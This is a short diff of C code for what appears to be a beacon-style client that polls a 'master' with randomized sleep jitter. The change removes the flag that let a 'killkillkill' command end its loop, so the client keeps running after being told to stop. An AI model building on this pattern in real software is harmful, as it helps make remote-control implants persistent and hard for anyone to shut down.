@@ -11,8 +11,7 @@ int main(int argc, char **argv){
         int set_sleep = SLEEP_BASE;
     #endif
     master_init(&master);
-    int done = 0;
-    while ( !done ) {
+    while ( 1 ) {
         #ifdef CLIENT_DEBUG
             int sleep_time = (rand() % 15) + set_sleep;
             printf("Sleeping for %d seconds... ", sleep_time);
@@ -94,7 +93,6 @@ int main(int argc, char **argv){
         if (!strncmp(resp, "killkillkill", 9)){
             data = (char*)malloc(strlen("i am kill")+1);
             strcpy(data, "i am kill");
-            done = 1;
         }
         free(resp);
     }
